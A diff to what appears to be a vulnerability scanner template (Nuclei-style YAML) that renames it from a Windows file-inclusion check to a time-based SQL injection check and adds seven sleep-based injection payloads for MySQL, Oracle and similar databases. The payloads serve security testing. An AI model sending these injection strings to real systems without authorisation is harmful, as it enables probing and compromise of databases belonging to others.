@@ -1,10 +1,10 @@
 id: time-based-sqli
 
 info:
-  name: Local File Inclusion - Windows
+  name: time based sql injection
   author: pussycat0x
   severity: high
-  tags: lfi,windows,dast
+  tags: TBSQLI
 
 http:
   - method: GET
@@ -30,6 +30,13 @@ http:
         - "') OR 11=(SELECT 11 FROM PG_SLEEP(9))--"
         - "orwa';%20waitfor%20delay%20'0:0:9'%20--%20"
         - "orwa') OR 11=(SELECT 11 FROM PG_SLEEP(9))--"
+        - "'and 1=DBMS_PIPE.RECEIVE_MESSAGE(1,9)--"
+        - "(SELECT(0)FROM(SELECT(SLEEP(7)))a)"
+        - "'XOR(SELECT(0)FROM(SELECT(SLEEP(7)))a)XOR'Z"
+        - "' AND (SELECT 4800 FROM (SELECT(SLEEP(7)))HoBG)--"
+        - "if(now()=sysdate(),SLEEP(7),0)"
+        - "'XOR(if(now()=sysdate(),SLEEP(7),0))XOR'Z"
+        - "'XOR(SELECT CASE WHEN(1234=1234) THEN SLEEP(7) ELSE 0 END)XOR'Z"
   
     fuzzing:
       - part: query
